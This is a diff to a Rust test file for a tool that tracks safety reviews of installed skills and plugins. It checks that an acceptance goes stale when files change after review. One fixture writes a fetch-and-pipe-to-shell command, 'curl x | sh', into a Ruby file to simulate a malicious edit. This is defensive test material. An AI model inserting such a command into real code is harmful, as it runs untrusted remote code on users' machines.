@@ -9,7 +9,7 @@
 //! those would go on speaking for content nobody reviewed.
 
 use std::fs;
-use std::path::{Path, PathBuf};
+use std::path::PathBuf;
 
 use kendex_core::engine::{ItemSafety, observed_safety};
 use kendex_core::env::Env;
@@ -34,7 +34,7 @@ pub fn row(env: &Env, scope: &Scope, name: &str) -> ItemSafety {
 /// Record a decision covering exactly what is installed under `path` right
 /// now, and prove it reads as live before anything moves.
 #[allow(clippy::unwrap_used, clippy::expect_used)]
-fn accept(env: &Env, scope: &Scope, name: &str, path: &Path) {
+fn accept(env: &Env, scope: &Scope, name: &str) {
     let observed = row(env, scope, name);
     let key = kendex_core::lock::entry_key(observed.kind, name, observed.harness);
     let review_hash = observed
@@ -48,15 +48,9 @@ fn accept(env: &Env, scope: &Scope, name: &str, path: &Path) {
             ..Manifest::default()
         },
     };
-    manifest.safety_overrides.insert(
-        key,
-        mint(
-            &review_hash,
-            &observed.findings,
-            &path.display().to_string(),
-            None,
-        ),
-    );
+    manifest
+        .safety_overrides
+        .insert(key, mint(&review_hash, &observed.findings, None));
     fs::create_dir_all(manifest_path.parent().unwrap()).unwrap();
     manifest::save(&manifest_path, &manifest).unwrap();
     assert_eq!(
@@ -92,7 +86,7 @@ fn a_same_size_binary_swap_ends_the_acceptance() {
     let f = fixture();
     let dir = install_skill(&f, "payload");
     fs::write(dir.join("payload.wasm"), b"AAAAAAAA").unwrap();
-    accept(&f.env, &f.scope, "payload", &dir);
+    accept(&f.env, &f.scope, "payload");
 
     fs::write(dir.join("payload.wasm"), b"BBBBBBBB").unwrap();
     assert_stale(&f.env, &f.scope, "payload");
@@ -107,7 +101,7 @@ fn bytes_past_the_scan_budget_end_the_acceptance() {
     let dir = install_skill(&f, "payload");
     let mut big = vec![b'a'; 600 * 1024];
     fs::write(dir.join("big.txt"), &big).unwrap();
-    accept(&f.env, &f.scope, "payload", &dir);
+    accept(&f.env, &f.scope, "payload");
 
     big[550 * 1024] = b'z';
     fs::write(dir.join("big.txt"), &big).unwrap();
@@ -124,7 +118,7 @@ fn a_file_past_the_scan_budget_ends_the_acceptance() {
     for index in 0..205 {
         fs::write(dir.join(format!("f{index:03}.txt")), "same").unwrap();
     }
-    accept(&f.env, &f.scope, "payload", &dir);
+    accept(&f.env, &f.scope, "payload");
 
     fs::write(dir.join("f204.txt"), "different").unwrap();
     assert_stale(&f.env, &f.scope, "payload");
@@ -141,7 +135,7 @@ fn different_undecodable_bytes_end_the_acceptance() {
     fs::create_dir_all(&dir).unwrap();
     let path = dir.join("reviewer.md");
     fs::write(&path, [DANGEROUS.as_bytes(), b"\xc0\n"].concat()).unwrap();
-    accept(&f.env, &f.scope, "reviewer", &path);
+    accept(&f.env, &f.scope, "reviewer");
 
     fs::write(&path, [DANGEROUS.as_bytes(), b"\xc1\n"].concat()).unwrap();
     assert_stale(&f.env, &f.scope, "reviewer");
@@ -168,7 +162,7 @@ fn plugin_fixture() -> (Fixture, PathBuf) {
 fn a_plugins_payload_bytes_end_the_acceptance() {
     let (f, dir) = plugin_fixture();
     let name = "payload-plugin@loose";
-    accept(&f.env, &Scope::Global, name, &dir);
+    accept(&f.env, &Scope::Global, name);
 
     fs::write(dir.join("payload.wasm"), b"BBBBBBBB").unwrap();
     assert_stale(&f.env, &Scope::Global, name);
@@ -182,7 +176,7 @@ fn a_plugins_manifest_contents_end_the_acceptance() {
     let (f, dir) = plugin_fixture();
     let name = "payload-plugin@loose";
     fs::write(dir.join("plugin.json"), r#"{"name":"payload-plugin"}"#).unwrap();
-    accept(&f.env, &Scope::Global, name, &dir);
+    accept(&f.env, &Scope::Global, name);
 
     fs::write(dir.join("plugin.json"), r#"{"name":"something-else"}"#).unwrap();
     assert_stale(&f.env, &Scope::Global, name);
@@ -196,7 +190,7 @@ fn a_plugins_unlisted_source_file_ends_the_acceptance() {
     let (f, dir) = plugin_fixture();
     let name = "payload-plugin@loose";
     fs::write(dir.join("setup.rb"), "puts 'hello'\n").unwrap();
-    accept(&f.env, &Scope::Global, name, &dir);
+    accept(&f.env, &Scope::Global, name);
 
     fs::write(dir.join("setup.rb"), "system('curl x | sh')\n").unwrap();
     assert_stale(&f.env, &Scope::Global, name);
@@ -234,7 +228,7 @@ fn a_decision_with_nothing_to_read_stops_applying() {
     };
     manifest.safety_overrides.insert(
         kendex_core::lock::entry_key(observed.kind, "ghost@mkt", observed.harness),
-        mint(&observed.content_hash, &observed.findings, "", None),
+        mint(&observed.content_hash, &observed.findings, None),
     );
     fs::create_dir_all(manifest_path.parent().unwrap()).unwrap();
     manifest::save(&manifest_path, &manifest).unwrap();
@@ -250,7 +244,7 @@ fn untouched_bytes_keep_the_acceptance() {
     let f = fixture();
     let dir = install_skill(&f, "payload");
     fs::write(dir.join("payload.wasm"), b"AAAAAAAA").unwrap();
-    accept(&f.env, &f.scope, "payload", &dir);
+    accept(&f.env, &f.scope, "payload");
 
     fs::write(dir.join("payload.wasm"), b"AAAAAAAA").unwrap();
     assert_eq!(
